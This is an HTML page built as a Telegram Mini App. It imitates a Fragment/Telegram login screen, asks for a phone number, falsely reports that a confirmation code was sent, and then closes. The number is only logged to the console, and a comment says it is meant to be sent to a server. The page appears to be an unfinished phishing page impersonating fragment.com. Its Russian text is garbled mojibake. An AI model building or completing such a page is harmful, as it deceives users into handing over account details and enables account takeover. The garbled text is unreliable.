<!DOCTYPE html>
<html>
<head>
    <title>Fragment Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: white;
            color: #000;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
            padding-top: 40px;
        }
        
        .telegram-icon {
            width: 80px;
            height: 80px;
            background: #0088cc;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        
        h1 {
            font-weight: 700;
            font-size: 20px;
            margin-bottom: 10px;
            color: #000;
        }
        
        .subtitle {
            color: #666;
            font-size: 16px;
            line-height: 1.4;
            margin-bottom: 30px;
        }
        
        .phone-label {
            color: #666;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .country-selector {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .country-flag {
            width: 30px;
            font-size: 18px;
        }
        
        select {
            flex: 1;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            background: white;
        }
        
        .phone-input {
            display: flex;
            align-items: center;
            border: 1px solid #ddd;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .country-code {
            padding: 12px 15px;
            background: #f8f9fa;
            border-right: 1px solid #ddd;
            font-size: 16px;
            color: #000;
        }
        
        input[type="tel"] {
            flex: 1;
            padding: 12px 15px;
            border: none;
            outline: none;
            font-size: 16px;
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            margin-top: 30px;
        }
        
        .btn {
            flex: 1;
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .btn-cancel {
            background: #f8f9fa;
            color: #666;
        }
        
        .btn-next {
            background: #0088cc;
            color: white;
        }
        
        .btn-cancel:hover {
            background: #e9ecef;
        }
        
        .btn-next:hover {
            background: #0077bb;
        }
        
        .info-text {
            color: #666;
            font-size: 14px;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="telegram-icon">‚úàÔ∏è</div>
            <h1>–í–æ–π–¥–∏—Ç–µ, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç Telegram</h1>
            <p class="subtitle">–¥–ª—è fragment.com –∏ Fragment Auction Alerts.</p>
        </div>
        
        <div class="form-group">
            <div class="phone-label">–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π <span style="color: #666;">–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</span> –≤ –º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ.</div>
            <p class="info-text">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram.</p>
            
            <div class="country-selector">
                <div class="country-flag" id="countryFlag">üá∑üá∫</div>
                <select id="countrySelect" onchange="updateCountryCode()">
                    <option value="+7">–†–æ—Å—Å–∏—è (+7)</option>
                    <option value="+1">–°–®–ê (+1)</option>
                    <option value="+44">–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è (+44)</option>
                    <option value="+49">–ì–µ—Ä–º–∞–Ω–∏—è (+49)</option>
                    <option value="+33">–§—Ä–∞–Ω—Ü–∏—è (+33)</option>
                    <option value="+39">–ò—Ç–∞–ª–∏—è (+39)</option>
                    <option value="+34">–ò—Å–ø–∞–Ω–∏—è (+34)</option>
                    <option value="+86">–ö–∏—Ç–∞–π (+86)</option>
                    <option value="+81">–Ø–ø–æ–Ω–∏—è (+81)</option>
                    <option value="+82">–ö–æ—Ä–µ—è (+82)</option>
                    <option value="+91">–ò–Ω–¥–∏—è (+91)</option>
                    <option value="+55">–ë—Ä–∞–∑–∏–ª–∏—è (+55)</option>
                    <option value="+61">–ê–≤—Å—Ç—Ä–∞–ª–∏—è (+61)</option>
                    <option value="+64">–ù–æ–≤–∞—è –ó–µ–ª–∞–Ω–¥–∏—è (+64)</option>
                    <option value="+971">–û–ê–≠ (+971)</option>
                    <option value="+966">–°–∞—É–¥–æ–≤—Å–∫–∞—è –ê—Ä–∞–≤–∏—è (+966)</option>
                    <option value="+380">–£–∫—Ä–∞–∏–Ω–∞ (+380)</option>
                    <option value="+375">–ë–µ–ª–∞—Ä—É—Å—å (+375)</option>
                    <option value="+77">–ö–∞–∑–∞—Ö—Å—Ç–∞–Ω (+77)</option>
                    <option value="+374">–ê—Ä–º–µ–Ω–∏—è (+374)</option>
                    <option value="+994">–ê–∑–µ—Ä–±–∞–π–¥–∂–∞–Ω (+994)</option>
                    <option value="+995">–ì—Ä—É–∑–∏—è (+995)</option>
                </select>
            </div>
            
            <div class="phone-input">
                <div class="country-code" id="countryCode">+7</div>
                <input type="tel" id="phoneNumber" placeholder="900 123 45 67" pattern="[0-9]*" inputmode="numeric">
            </div>
        </div>
        
        <div class="button-group">
            <button class="btn btn-cancel" onclick="closeApp()">–û—Ç–º–µ–Ω–∞</button>
            <button class="btn btn-next" onclick="sendCode()">–î–∞–ª–µ–µ</button>
        </div>
    </div>

    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
        let tg = window.Telegram.WebApp;
        tg.expand();
        
        // –§–ª–∞–≥–∏ —Å—Ç—Ä–∞–Ω –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
        const countryFlags = {
            '+7': 'üá∑üá∫',
            '+1': 'üá∫üá∏', 
            '+44': 'üá¨üáß',
            '+49': 'üá©üá™',
            '+33': 'üá´üá∑',
            '+39': 'üáÆüáπ',
            '+34': 'üá™üá∏',
            '+86': 'üá®üá≥',
            '+81': 'üáØüáµ',
            '+82': 'üá∞üá∑',
            '+91': 'üáÆüá≥',
            '+55': 'üáßüá∑',
            '+61': 'üá¶üá∫',
            '+64': 'üá≥üáø',
            '+971': 'üá¶üá™',
            '+966': 'üá∏üá¶',
            '+380': 'üá∫üá¶',
            '+375': 'üáßüáæ',
            '+77': 'üá∞üáø',
            '+374': 'üá¶üá≤',
            '+994': 'üá¶üáø',
            '+995': 'üá¨üá™'
        };
        
        function updateCountryCode() {
            const select = document.getElementById('countrySelect');
            const code = select.value;
            document.getElementById('countryCode').textContent = code;
            document.getElementById('countryFlag').textContent = countryFlags[code] || 'üá∫üá≥';
        }
        
        function sendCode() {
            const phoneNumber = document.getElementById('phoneNumber').value;
            const countryCode = document.getElementById('countryCode').textContent;
            const fullNumber = countryCode + phoneNumber.replace(/\s/g, '');
            
            if (!phoneNumber) {
                alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }
            
            // –ó–¥–µ—Å—å –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            console.log('Phone number:', fullNumber);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—Ö–µ
            tg.showPopup({
                title: "–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!",
                message: "–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram.",
                buttons: [{ type: "ok" }]
            });
            
            // –ó–∞–∫—Ä—ã–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(() => {
                tg.close();
            }, 2000);
        }
        
        function closeApp() {
            tg.close();
        }
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞
        document.getElementById('phoneNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 0) {
                value = value.match(/.{1,3}/g).join(' ');
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
